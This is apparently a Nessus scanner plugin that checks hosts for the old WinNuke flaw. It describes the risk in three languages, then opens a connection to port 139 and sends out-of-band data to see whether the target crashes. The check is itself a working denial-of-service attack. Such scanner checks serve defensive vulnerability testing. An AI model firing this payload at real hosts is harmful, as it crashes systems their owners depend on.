#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10314);
 script_bugtraq_id(2010);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-1999-0153");
 
 name["english"] = "Winnuke";
 name["francais"] = "Winnuke";
 name["deutsch"] = "Winnuke";
 script_name(english:name["english"], francais:name["francais"], deutsch:name["deutsch"]);
 
 desc["english"] = "It was possible to crash
the remote host using the 'Winnuke' attack,
that is to send an OOB message to this port.

An attacker may use this flaw to make this
host crash continuously, preventing the
system from working properly.


Solution : upgrade your operating system.

Risk factor : High";


 desc["francais"] = "Il a été possible de
faire planter la machine distante en
utilisant l'attaque 'Winnuke', qui consiste
à envoyer un message OOB à ce port.

Un pirate peut utiliser ce problème pour
faire planter continuellement cette 
machine, vous empechant ainsi de travailler
correctement.


Solution : mettez à jour votre système
d'exploitation

Facteur de risque : Elevé";

 desc["deutsch"] = "Es war möglich, den überprüften Rechner durch 
senden einer OOB_MSG an den entsprechenden Port, auch 
als 'Winnuke' Attacke bekannt, abstürzen zu lassen.

Ein Angreifer kann diese Methode benutzen um den Host
kontinuierlich abstürzen zu lassen, was ein produktives
Arbeiten verhindern kann.

Lösung: Installieren Sie dementsprechende Updates für dieses Betriebssystem

Risikofaktor: Hoch";

 script_description(english:desc["english"], francais:desc["francais"], deutsch:desc["deutsch"]);
 
 summary["english"] = "MSG_OOB against the remote host";
 summary["francais"] = "MSG_OOB sur la machine distante";
 summary["deutsch"] = "MSG_OOB gegen den entfernten Rechner";
 script_summary(english:summary["english"], francais:summary["francais"], deutsch:summary["deutsch"]);
 
 script_category(ACT_KILL_HOST);
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison",
		deutsch:"Dieses Skript ist urheberrechtlich geschützt (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 family["deutsch"] = "Denial of Service";

 script_family(english:family["english"], francais:family["francais"], deutsch:family["deutsch"]);
 script_require_ports(139);
 exit(0);
}

#
# The script code starts here
#

port = 139;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  start_denial();
  data = "you are dead";
  send(socket:soc,data:data, option:MSG_OOB);
  close(soc);
  alive = end_denial();
  if(!alive){
  		security_hole(port);
		set_kb_item(name:"Host/dead", value:TRUE);
		}
 }
}
